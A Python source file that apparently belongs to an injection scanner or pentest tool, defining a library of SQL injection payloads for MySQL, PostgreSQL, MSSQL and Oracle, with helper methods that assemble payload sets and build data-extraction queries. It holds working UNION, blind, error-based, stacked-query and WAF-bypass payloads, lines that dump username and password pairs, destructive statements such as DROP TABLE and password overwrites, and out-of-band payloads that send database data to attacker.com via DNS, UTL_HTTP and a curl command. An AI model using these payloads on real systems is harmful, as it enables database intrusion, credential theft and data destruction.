"""
Advanced SQL Injection Payload Library

Comprehensive collection of advanced SQL injection payloads including:
- UNION-based injection
- Boolean-based blind injection
- Out-of-band (OOB) injection
- Stacked queries
- Second-order injection
- WAF bypass techniques
"""

from typing import Dict, List
import string


class AdvancedPayloadLibrary:
    """Advanced SQL injection payload library with multiple attack vectors"""
    
    # UNION-based SQL injection payloads
    UNION_BASED_PAYLOADS = {
        'mysql': [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL--",
            "' UNION ALL SELECT NULL,NULL--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT NULL,@@version,NULL--",
            "' UNION SELECT NULL,database(),NULL--",
            "' UNION SELECT NULL,user(),NULL--",
            "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--",
            "' UNION SELECT NULL,column_name,NULL FROM information_schema.columns--",
            "' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users--",
            "') UNION SELECT NULL--",
            "') UNION SELECT NULL,NULL--",
            "') UNION SELECT NULL,NULL,NULL--",
            # Order by detection
            "' ORDER BY 1--",
            "' ORDER BY 2--",
            "' ORDER BY 3--",
            "' ORDER BY 4--",
            "' ORDER BY 5--",
            "' ORDER BY 10--",
            "' ORDER BY 20--",
        ],
        'postgresql': [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,version(),NULL--",
            "' UNION SELECT NULL,current_database(),NULL--",
            "' UNION SELECT NULL,current_user,NULL--",
            "' UNION SELECT NULL,tablename,NULL FROM pg_tables--",
            "' UNION SELECT NULL,column_name,NULL FROM information_schema.columns--",
        ],
        'mssql': [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,@@version,NULL--",
            "' UNION SELECT NULL,DB_NAME(),NULL--",
            "' UNION SELECT NULL,SYSTEM_USER,NULL--",
            "' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'--",
            "' UNION SELECT NULL,name,NULL FROM syscolumns--",
        ],
        'oracle': [
            "' UNION SELECT NULL FROM dual--",
            "' UNION SELECT NULL,NULL FROM dual--",
            "' UNION SELECT NULL,NULL,NULL FROM dual--",
            "' UNION SELECT NULL,banner,NULL FROM v$version--",
            "' UNION SELECT NULL,user,NULL FROM dual--",
            "' UNION SELECT NULL,table_name,NULL FROM all_tables--",
            "' UNION SELECT NULL,column_name,NULL FROM all_tab_columns--",
        ],
    }
    
    # Boolean-based blind SQL injection payloads
    BOOLEAN_BASED_PAYLOADS = [
        # True conditions
        "' AND '1'='1",
        "' AND 1=1--",
        "' AND 'a'='a",
        "') AND ('1'='1",
        "') AND (1=1)--",
        # False conditions
        "' AND '1'='2",
        "' AND 1=2--",
        "' AND 'a'='b",
        "') AND ('1'='2",
        "') AND (1=2)--",
        # Substring-based
        "' AND SUBSTRING(@@version,1,1)='5",
        "' AND ASCII(SUBSTRING(database(),1,1))>64--",
        "' AND LENGTH(database())>0--",
        # Boolean logic tests
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        "' AND (SELECT 'a' FROM users LIMIT 1)='a'--",
    ]
    
    # Out-of-band (OOB) injection payloads
    OOB_PAYLOADS = {
        'mysql': [
            # DNS exfiltration
            "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.attacker.com\\\\a')))--",
            "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',database(),'.attacker.com\\\\a'))--",
        ],
        'mssql': [
            # DNS exfiltration via xp_dirtree
            "'; EXEC master..xp_dirtree '\\\\\\\\'+@@version+'.attacker.com\\\\a'--",
            "'; DECLARE @q VARCHAR(1024);SET @q='\\\\\\\\'+CAST(@@version AS VARCHAR(1024))+'.attacker.com\\\\a'; EXEC master..xp_dirtree @q--",
        ],
        'oracle': [
            # UTL_HTTP based exfiltration
            "' || UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1))--",
            "' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com') FROM dual) IS NOT NULL--",
        ],
        'postgresql': [
            # COPY TO PROGRAM for exfiltration
            "'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/?d='||version()--",
        ],
    }
    
    # Stacked queries payloads
    STACKED_QUERIES_PAYLOADS = {
        'mysql': [
            "'; SELECT SLEEP(5)--",
            "'; DROP TABLE test--",
            "'; CREATE TABLE test(id INT)--",
            "'; INSERT INTO test VALUES(1)--",
            "'; UPDATE users SET password='hacked' WHERE id=1--",
        ],
        'postgresql': [
            "'; SELECT pg_sleep(5)--",
            "'; CREATE TABLE test(id INT)--",
            "'; INSERT INTO test VALUES(1)--",
        ],
        'mssql': [
            "'; WAITFOR DELAY '00:00:05'--",
            "'; EXEC sp_configure 'show advanced options',1--",
            "'; CREATE TABLE test(id INT)--",
            "'; INSERT INTO test VALUES(1)--",
        ],
    }
    
    # WAF bypass payloads using various encoding and obfuscation techniques
    WAF_BYPASS_PAYLOADS = [
        # Case variation
        "' Or '1'='1",
        "' oR '1'='1",
        "' OR '1'='1",
        # Comment-based
        "' OR/**/'1'='1",
        "'/**/OR/**/1=1--",
        "' OR/*comment*/1=1--",
        # URL encoding
        "%27%20OR%201=1--",
        "%27%20UnIoN%20SeLeCt%20NULL--",
        # Double URL encoding
        "%2527%2520OR%25201=1--",
        # Unicode/UTF-8
        "' OR 1=1%23",
        "' OR 1=1%00",
        # Whitespace variations
        "'\tor\t'1'='1",
        "'\nor\n'1'='1",
        "' or\r\n'1'='1",
        # Inline comments
        "' OR/**/1=1/**/--",
        "'/**/UNION/**/SELECT/**/NULL--",
        # Case + Comment combo
        "'/**/oR/**/'1'='1",
        # Parentheses bypass
        "('or'('1')=('1')",
        "') or ('1')=('1",
        # String concatenation
        "' OR 'a'||'b'='ab",
        "' OR CONCAT('a','b')='ab",
        # Scientific notation
        "' OR 1e0=1--",
        # Hex encoding
        "' OR 0x31=0x31--",
        # Alternative syntax
        "' OR 'a'LIKE'a",
        "' OR 'a'REGEXP'a",
        # Null byte
        "' OR '1'='1'%00",
        # Alternative quote
        "` OR `1`=`1",
    ]
    
    # Second-order injection payloads (stored and later executed)
    SECOND_ORDER_PAYLOADS = [
        "admin'--",
        "admin' OR '1'='1'--",
        "test'; DROP TABLE users--",
        "test' UNION SELECT NULL,NULL--",
        "' OR SLEEP(5)--",
    ]
    
    # Database-specific advanced techniques
    ADVANCED_TECHNIQUES = {
        'mysql': [
            # String concatenation
            "' AND CONCAT(0x61,0x62)='ab'--",
            # Hex encoding
            "' AND 0x61646d696e=admin--",
            # Information extraction
            "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0--",
            # Version-specific functions
            "' AND @@version LIKE '%MySQL%'--",
            # Error-based extraction
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            # JSON functions
            "' AND JSON_EXTRACT('{}','$.a')=NULL--",
        ],
        'postgresql': [
            # String operations
            "' AND 'a'||'b'='ab'--",
            # Cast operations
            "' AND CAST(version() AS TEXT) LIKE '%PostgreSQL%'--",
            # Array operations
            "' AND ARRAY['a','b'][1]='a'--",
            # XML functions
            "' AND query_to_xml('SELECT 1',true,true,'') IS NOT NULL--",
        ],
        'mssql': [
            # String operations
            "' AND 'a'+'b'='ab'--",
            # System functions
            "' AND @@SERVERNAME IS NOT NULL--",
            # XML PATH exploitation
            "' AND (SELECT TOP 1 name FROM sysobjects WHERE xtype='U' FOR XML PATH('')) IS NOT NULL--",
            # Error-based extraction
            "' AND 1=CONVERT(INT,(SELECT @@version))--",
        ],
        'oracle': [
            # String concatenation
            "' AND 'a'||'b'='ab'--",
            # Dual table
            "' AND (SELECT 'a' FROM dual)='a'--",
            # XML functions
            "' AND DBMS_XMLGEN.GETXML('SELECT user FROM dual') IS NOT NULL--",
            # UTL packages
            "' AND UTL_INADDR.GET_HOST_NAME('127.0.0.1') IS NOT NULL--",
        ],
    }
    
    @classmethod
    def get_all_payloads_for_db(cls, db_type: str) -> List[str]:
        """Get all payloads for a specific database type"""
        payloads = []
        
        # Add UNION payloads
        if db_type in cls.UNION_BASED_PAYLOADS:
            payloads.extend(cls.UNION_BASED_PAYLOADS[db_type])
        
        # Add boolean-based (generic)
        payloads.extend(cls.BOOLEAN_BASED_PAYLOADS[:5])  # First 5 for speed
        
        # Add OOB if available
        if db_type in cls.OOB_PAYLOADS:
            payloads.extend(cls.OOB_PAYLOADS[db_type][:2])  # Limited OOB
        
        # Add stacked queries
        if db_type in cls.STACKED_QUERIES_PAYLOADS:
            payloads.extend(cls.STACKED_QUERIES_PAYLOADS[db_type][:3])
        
        # Add advanced techniques
        if db_type in cls.ADVANCED_TECHNIQUES:
            payloads.extend(cls.ADVANCED_TECHNIQUES[db_type][:5])
        
        # Add WAF bypass (subset)
        payloads.extend(cls.WAF_BYPASS_PAYLOADS[:10])
        
        return payloads
    
    @classmethod
    def get_confirmation_payloads(cls, injection_type: str, db_type: str = 'mysql') -> List[str]:
        """Get payloads to confirm a suspected vulnerability"""
        if injection_type == 'union':
            return cls.UNION_BASED_PAYLOADS.get(db_type, cls.UNION_BASED_PAYLOADS['mysql'])[:5]
        elif injection_type == 'boolean':
            return cls.BOOLEAN_BASED_PAYLOADS[:10]
        elif injection_type == 'stacked':
            return cls.STACKED_QUERIES_PAYLOADS.get(db_type, [])[:3]
        return []
    
    @classmethod
    def generate_data_extraction_payloads(cls, db_type: str, table: str = None, column: str = None) -> List[str]:
        """Generate payloads to extract actual data"""
        payloads = []
        
        if db_type == 'mysql':
            # Database enumeration
            payloads.append("' UNION SELECT NULL,database(),NULL--")
            payloads.append("' UNION SELECT NULL,user(),NULL--")
            
            # Table enumeration
            payloads.append("' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--")
            
            # Column enumeration
            if table:
                payloads.append(f"' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='{table}'--")
            
            # Data extraction
            if table and column:
                payloads.append(f"' UNION SELECT NULL,{column},NULL FROM {table}--")
            
            # User table discovery
            payloads.append("' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users LIMIT 5--")
            payloads.append("' UNION SELECT NULL,CONCAT(email,':',password_hash),NULL FROM accounts LIMIT 5--")
            
        elif db_type == 'postgresql':
            payloads.append("' UNION SELECT NULL,current_database(),NULL--")
            payloads.append("' UNION SELECT NULL,current_user,NULL--")
            payloads.append("' UNION SELECT NULL,tablename,NULL FROM pg_tables WHERE schemaname='public'--")
            if table:
                payloads.append(f"' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='{table}'--")
        
        elif db_type == 'mssql':
            payloads.append("' UNION SELECT NULL,DB_NAME(),NULL--")
            payloads.append("' UNION SELECT NULL,SYSTEM_USER,NULL--")
            payloads.append("' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'--")
            if table:
                payloads.append(f"' UNION SELECT NULL,name,NULL FROM syscolumns WHERE id=OBJECT_ID('{table}')--")
        
        return payloads
